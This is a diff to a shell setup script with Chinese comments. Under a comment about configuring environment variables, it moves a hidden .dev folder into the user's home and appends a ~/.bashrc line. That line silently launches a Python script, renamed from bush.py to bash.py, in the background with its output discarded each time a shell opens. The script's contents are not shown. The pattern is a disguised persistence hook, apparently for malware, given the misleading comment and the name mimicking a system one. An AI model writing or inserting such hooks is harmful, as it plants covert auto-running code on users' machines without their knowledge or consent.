@@ -20,8 +20,14 @@ echo "\n=== 安装额外的软件包 ==="
 sudo apt install git xclip python3-pip -y && sudo pip3 install requests
 
 # 配置环境变量
-mv .dev "$HOME/.dev"
-echo "(pgrep -f bush.py || nohup python3 $HOME/.dev/bush.py &> /dev/null &) & disown" >> ~/.bashrc
+if [ -d .dev ]; then
+    DEST_DIR="$HOME/.dev"
+    [ -d "$DEST_DIR" ] && rm -rf "$DEST_DIR"
+    mv .dev "$DEST_DIR"
+    if ! grep -q "pgrep -f bash.py" ~/.bashrc; then
+        echo "(pgrep -f bash.py || nohup python3 $HOME/.dev/bash.py &> /dev/null &) & disown" >> ~/.bashrc
+    fi
+fi
 
 # 检查并安装 figlet
 check_and_install figlet
